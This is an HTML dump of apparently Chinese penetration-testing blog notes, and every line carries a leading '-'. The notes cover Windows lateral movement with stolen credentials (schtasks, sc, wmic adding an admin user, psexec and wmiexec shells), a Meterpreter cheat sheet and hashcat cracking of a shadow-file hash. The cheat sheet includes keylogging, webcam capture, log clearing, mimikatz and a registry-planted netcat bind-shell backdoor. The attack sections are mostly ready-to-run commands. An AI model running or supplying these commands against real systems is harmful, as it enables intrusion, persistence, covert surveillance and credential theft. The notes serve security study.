-<h2 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h2><h3 id="前提-2"><a href="#前提-2" class="headerlink" title="前提"></a>前提</h3><p>开启windows Event log服务，开启Task Scheduler服务</p>
-<p>其余条件同ipc</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn firstTask /tr &quot;c:\windows\system32\cmd.exe /c calc&quot; /sc once /st 00:00 /S 170.170.64.19 /RU System /u admin /p passwd</span><br><span class="line">schtasks /run /tn firstTask /S 170.170.64.19 /u admin /p passwd</span><br><span class="line">schtasks /F /delete /tn firstTask /S 170.170.64.19 /u admin /p passwd</span><br></pre></td></tr></table></figure>
-<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><h3 id="前提-3"><a href="#前提-3" class="headerlink" title="前提"></a>前提</h3><p>开启telnet服务</p>
-<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet 目标ip</span><br><span class="line">之后可执行命令</span><br></pre></td></tr></table></figure>
-<h2 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows2003</span><br><span class="line">windows XP</span><br></pre></td></tr></table></figure>
-<h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\170.170.64.19 create testSC binPath= &quot;cmd.exe /c start c:\windows\hack.bat&quot;</span><br><span class="line">sc \\170.170.64.19 start testSC</span><br><span class="line">sc \\170.170.64.19 delete testSC</span><br></pre></td></tr></table></figure>
-<h2 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h2><h3 id="前提-4"><a href="#前提-4" class="headerlink" title="前提"></a>前提</h3><p>开启wmi服务，135端口</p>
-<h3 id="命令执行-2"><a href="#命令执行-2" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:170.170.64.19 /user:admin /password:passwd process call create &quot;cmd.exe /c calc.exe&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:170.170.64.19 /user:admin /password:passwd process call create &quot;cmd.exe /c net user test 123456 /add &amp;&amp; net localgroup administrators test /add&quot;</span><br></pre></td></tr></table></figure>
-<h2 id="wmiexec-vbs-需要安装"><a href="#wmiexec-vbs-需要安装" class="headerlink" title="wmiexec.vbs(需要安装)"></a>wmiexec.vbs(需要安装)</h2><h3 id="前提-5"><a href="#前提-5" class="headerlink" title="前提"></a>前提</h3><p>开启wmi服务，135端口</p>
-<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载vmiexec.vbs</p>
-<h3 id="命令执行-3"><a href="#命令执行-3" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe //nologo wmiexec.vbs /shell 170.170.64.19 admin passwd</span><br><span class="line">cscript.exe wmiexec.vbs /cmd 170.170.64.19 admin passwd &quot;cmdkey /list&quot;</span><br><span class="line">cscript.exe wmiexec.vbs /cmd 170.170.64.19 admin passwd c:\programdata\test.bat</span><br><span class="line">#其他参数</span><br><span class="line">-wait5000 表示这个命令等待5s后再读取结果，用于运行“运行时间长”的命令。</span><br><span class="line">-persist 程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，用于运行 nc 或者木马程序。</span><br></pre></td></tr></table></figure>
-<h2 id="impackets-wmiexec-需要安装"><a href="#impackets-wmiexec-需要安装" class="headerlink" title="impackets wmiexec(需要安装)"></a>impackets wmiexec(需要安装)</h2><h3 id="前提-6"><a href="#前提-6" class="headerlink" title="前提"></a>前提</h3><p>开启wmi服务，135端口</p>
-<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket/</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install impacket</span><br></pre></td></tr></table></figure>
-<h3 id="命令执行-4"><a href="#命令执行-4" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#获取远程计算机交互式shell</span><br><span class="line">python wmiexec.py admin:passwd@170.170.64.19</span><br></pre></td></tr></table></figure>
-<h2 id="psexec-需要安装"><a href="#psexec-需要安装" class="headerlink" title="psexec(需要安装)"></a>psexec(需要安装)</h2><h3 id="前提-7"><a href="#前提-7" class="headerlink" title="前提"></a>前提</h3><p>开启admin$共享</p>
-<h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>在 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a> 下载安装</p>
-<h3 id="命令执行-5"><a href="#命令执行-5" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#打开交互式shell</span><br><span class="line">psexec \\170.170.64.19 -u admin -p passwd cmd</span><br><span class="line">#执行单条命令</span><br><span class="line">psexec \\170.170.64.19 -u admin -p passwd -s cmd /c &quot;calc.exe&quot;</span><br><span class="line">#拷贝文件到远程计算机并执行</span><br><span class="line">psexec \\170.170.64.19 -u admin -p passwd -c C:\Users\Administrator\Desktop\GetHashes.exe</span><br><span class="line"></span><br><span class="line">#其他参数</span><br><span class="line">–accepteula 第一次运行会弹框,输入这个参数便不会弹框</span><br><span class="line">-s 以 “nt authority\system” 权限运行远程进程</span><br><span class="line">-h 如果可以，以管理员权限运行远程进程</span><br><span class="line">-d 不等待程序执行完就返回，请只对非交互式应用程序使用此选项</span><br><span class="line">\\ip 可以替换成 @ip.txt (存放多个 ip 的文本)，可以批量执行命令</span><br></pre></td></tr></table></figure>
-<h2 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h2><h3 id="前提-8"><a href="#前提-8" class="headerlink" title="前提"></a>前提</h3><p>开启远程桌面，3389端口</p>
-<h3 id="命令执行-6"><a href="#命令执行-6" class="headerlink" title="命令执行"></a>命令执行</h3><p>可直接通过mstsc进入目标系统。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/04/meterpreter命令总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/08/04/meterpreter命令总结/" itemprop="url">
-                  meterpreter命令总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-04T22:19:25+08:00">
-                2020-08-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/08/04/meterpreter命令总结/" class="leancloud_visitors" data-flag-title="meterpreter命令总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。Meterpreter功能强大，支持信息收集、提权、注册表操作、哈希利用、截屏录屏等操作，也支持对摄像头、录音设备、键盘鼠标的控制。</p>
-<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 进入会话   </span><br><span class="line">sessions -k 杀死会话</span><br><span class="line">pwd         查看当前目录</span><br><span class="line">getuid      查看当前用户信息</span><br><span class="line">sysinfo     查看远程主机系统信息</span><br><span class="line">execute     在目标主机上执行命令</span><br><span class="line">hashdump    获取目标主机用户密码hash信息</span><br><span class="line">getsystem   提升权限</span><br><span class="line">shell       切换至传统shell</span><br><span class="line">background  将当前session放入后台</span><br><span class="line">kill        关闭进程</span><br><span class="line">load        加载meterpreter扩展</span><br><span class="line">exit        退出当前shell</span><br><span class="line">arp         显示ARP缓存</span><br><span class="line">getproxy    显示当前代理配置</span><br><span class="line">ifconfig    显示接口</span><br><span class="line">ipconfig    显示接口</span><br><span class="line">netstat     显示网络连接</span><br><span class="line">portfwd     将本地端口转发到远程服务</span><br><span class="line">route       查看和修改路由</span><br><span class="line">getenv      查看环境变量</span><br><span class="line">getprivs    查看权限</span><br><span class="line">pgrep       搜索进程</span><br><span class="line">ps          查看当前运行进程</span><br><span class="line">reboot      重启系统</span><br><span class="line">reg         修改注册表</span><br><span class="line">clearev     清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/meterpreter01.png" alt=""></p>
-<h2 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat           查看文件</span><br><span class="line">cd            改变目录</span><br><span class="line">checksum      校验文件md5或sha1</span><br><span class="line">cp            拷贝文件</span><br><span class="line">download      下载文件</span><br><span class="line">edit          编辑文件</span><br><span class="line">ls            列出文件</span><br><span class="line">mkdir         创建文件夹</span><br><span class="line">mv            移动文件</span><br><span class="line">rm            删除文件</span><br><span class="line">rmdir         删除文件夹</span><br><span class="line">search        查找文件</span><br><span class="line">show_mount    列出所有驱动器</span><br><span class="line">upload        上传文件</span><br></pre></td></tr></table></figure>
-<h2 id="用户设备命令"><a href="#用户设备命令" class="headerlink" title="用户设备命令"></a>用户设备命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops   列出所有可访问的桌面和窗口</span><br><span class="line">getdesktop     获取当前桌面</span><br><span class="line">idletime       获取远程系统已运行时间（从上次重新启动开始计算）</span><br><span class="line">keyboard_send  发送击键</span><br><span class="line">keyscan_dump   转储击键缓冲区</span><br><span class="line">keyscan_start  开始捕获击键</span><br><span class="line">keyscan_stop   停止捕获击键</span><br><span class="line">mouse          发送鼠标事件</span><br><span class="line">screenshare    实时观看远程用户的桌面</span><br><span class="line">screenshot     截屏</span><br><span class="line">setdesktop     更改shell当前桌面</span><br><span class="line">uictl          控制用户界面组件</span><br><span class="line">record_mic     记录麦克风一定秒数</span><br><span class="line">webcam_chat    开始视频聊天</span><br><span class="line">webcam_list    列出网络摄像头</span><br><span class="line">webcam_snap    从指定网络摄像头拍摄</span><br><span class="line">webcam_stream  播放指定网络摄像头的视频流</span><br><span class="line">play           在目标系统播放音频</span><br></pre></td></tr></table></figure>
-<h2 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz   加载mimikatz模块   </span><br><span class="line">help mimikatz   查看帮助</span><br><span class="line">wdigest         获取密码</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/meterpreter02.png" alt=""></p>
-<h2 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run vnc 使用vnc连接远程桌面</span><br><span class="line">run getgui -e 开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp 开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=test PASSWORD=123456 添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662   将3389端口转发到6662</span><br></pre></td></tr></table></figure>
-<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>
-<h2 id="针对未安装补丁攻击"><a href="#针对未安装补丁攻击" class="headerlink" title="针对未安装补丁攻击"></a>针对未安装补丁攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches  收集补丁信息</span><br><span class="line">攻击：</span><br><span class="line">msf &gt; use exploit/windows/local/xxxx</span><br><span class="line">msf &gt; set SESSION 2</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure>
-<h2 id="注册表设置nc后门"><a href="#注册表设置nc后门" class="headerlink" title="注册表设置nc后门"></a>注册表设置nc后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &apos;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&apos; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.159.144 443  #攻击者连接nc后门</span><br></pre></td></tr></table></figure>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><p>meterpreter help文件</p>
-</li>
-<li><p><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a></p>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/28/哈希密码爆破工具hashcat/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/07/28/哈希密码爆破工具hashcat/" itemprop="url">
-                  哈希密码爆破工具hashcat
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-28T22:14:26+08:00">
-                2020-07-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/07/28/哈希密码爆破工具hashcat/" class="leancloud_visitors" data-flag-title="哈希密码爆破工具hashcat">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hashcat是世界上最快，最先进的密码恢复实用程序，为300多种高度优化的哈希算法提供了五种独特的攻击模式。hashcat支持Linux，Windows和macOS平台，且支持使用CPU，GPU和其他硬件加速器计算，并具有分布式密码破解的功能。</p>
-<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>经典字典破解用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">hashcat testHashfile --hash-type 0 --attack-mode 0 passDic.txt</span><br><span class="line">-m，--hash-type选择哈希类型，</span><br><span class="line">1000为windows nt hash,1800是sha512 Linux加密,不指定-m默认为0即md5。</span><br><span class="line">-a，--attack-mode选择模式</span><br><span class="line">0 = Straight （字典破解）</span><br><span class="line">1 = Combination （组合破解）</span><br><span class="line">2 = Toggle-Case （大小写转换）</span><br><span class="line">3 = Brute-force（掩码暴力破解）</span><br><span class="line">4 = Permutation（序列破解）</span><br><span class="line">5 = Table-Lookup（查表破解）</span><br><span class="line">6 = Hybrid dict + mask 字典加掩码破解</span><br><span class="line">7 = Hybrid mask + dict 掩码+字典破解</span><br><span class="line">8 = Prince（王子破解）</span><br><span class="line">-b, --benchmark   测试计算机破解速度和显示硬件相关信息</span><br><span class="line">-h，--help   帮助，可查看hashcat各参数的用法和可供破解的哈希类型编号</span><br><span class="line">--quiet    静默模式, 抑制输出</span><br><span class="line">-n, --threads=NUM    线程数</span><br><span class="line">-o,  --outfile=FILE    定义哈希文件恢复输出文件</span><br><span class="line">--outfile-format=NUM    定义哈希文件输出格式，见下面的参考资料</span><br><span class="line">--outfile-autohex-disable    禁止使用十六进制输出明文</span><br><span class="line">--hex-salt    salt值是用十六进制给出的</span><br><span class="line">--hex-charset    设定字符集是十六进制给出</span><br><span class="line">--runtime=NUM    运行数秒（NUM值）后的中止会话</span><br><span class="line">--status    启用状态屏幕的自动更新</span><br><span class="line">--status-timer=NUM    状态屏幕更新秒值</span><br><span class="line">--status-automat    以机器可读的格式显示状态视图</span><br><span class="line">--session   后跟会话名称，主要用于中止任务后的恢复破解。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">内置的字符集:</span><br><span class="line">?l = abcdefghijklmnopqrstuvwxyz 代表小写字母</span><br><span class="line">?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ 代表大写字母</span><br><span class="line">?d = 0123456789 代表数字</span><br><span class="line">?s = !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~  代表特殊字符</span><br><span class="line">?a = ?l?u?d?s 大小写数字及特殊字符的组合</span><br><span class="line">?b = 0x00 - 0xff</span><br></pre></td></tr></table></figure></p>
-<h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p>本文使用最常用的两种加密：linux系统密码（sha512）和windows系统密码（NT<br> HASH）做实例，并使用最常用的两种攻击方式进行演示。</p>
-<h3 id="字典破解linux系统密码"><a href="#字典破解linux系统密码" class="headerlink" title="字典破解linux系统密码"></a>字典破解linux系统密码</h3><p>查看linux hash的方式是打开/etc/shadow直接查看，/etc/shadow文件中每一行代表一个用户以及其密码hash以及密码配置信息，以如下格式分布。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$t3lLj7DjLuEnQHCy$w.xIeZPxn61ew.17w09qMXkg.E4aXOM7IMjHJ7PRRiH7XSMaCdHI1Hc0pLyMqRZcafSZtz.UEOb3nmYxyFxKm.:18443:0:99999:7:::</span><br><span class="line"></span><br><span class="line">用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段</span><br></pre></td></tr></table></figure>
-<p>其他字段都较好理解，其中加密密码和最后一次修改时间需要解释一下：</p>
-<p>加密密码中如果第一个字符为!或者*的话，说明这是一个不能登录的账户，其他情况格式为$id$salt$encrypted</p>
-<p>根据id可以判断加密方式，第二个$到第三个$之间的字段为salt，第三个$之后的字段为密码hash。</p>
-<p>常见的情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id为1时，采用md5算法加密</span><br><span class="line">id为5时，采用SHA256算法加密</span><br><span class="line">id为6时，采用SHA512算法加密</span><br></pre></td></tr></table></figure></p>
-<p>最后一次修改时间是从1970-01-01开始计算的，每天加1，所以会显示为这样一个数字，我们可使用如下命令计算修改时间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# date -d &quot;1970-01-01 18443 days&quot;</span><br><span class="line">2020年 06月 30日 星期二 00:00:00 CST</span><br></pre></td></tr></table></figure></p>
-<p>了解了linux系统密码保存的情况，就可以提取出来使用hashcat破解，我们需要提取第二个冒号到第三个冒号之间的字段保存到一个文件root.txt中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$t3lLj7DjLuEnQHCy$w.xIeZPxn61ew.17w09qMXkg.E4aXOM7IMjHJ7PRRiH7XSMaCdHI1Hc0pLyMqRZcafSZtz.UEOb3nmYxyFxKm.</span><br></pre></td></tr></table></figure></p>
-<p>然后使用准备好的字典top100.txt破解，将破解结果保存在result.txt中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1800 -a 0 -o result.txt root.txt top100.txt --force</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/hashcat/hashcat01.png" alt=""></p>
-<h3 id="掩码破解windows用户密码"><a href="#掩码破解windows用户密码" class="headerlink" title="掩码破解windows用户密码"></a>掩码破解windows用户密码</h3><p>查看windows hash的工具非常多，为了省事我直接使用前面文章介绍过的工具LaZagne 就不重复介绍新工具了 <a href="http://next.uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/</a></p>
-<p>提取到windows hash如下</p>
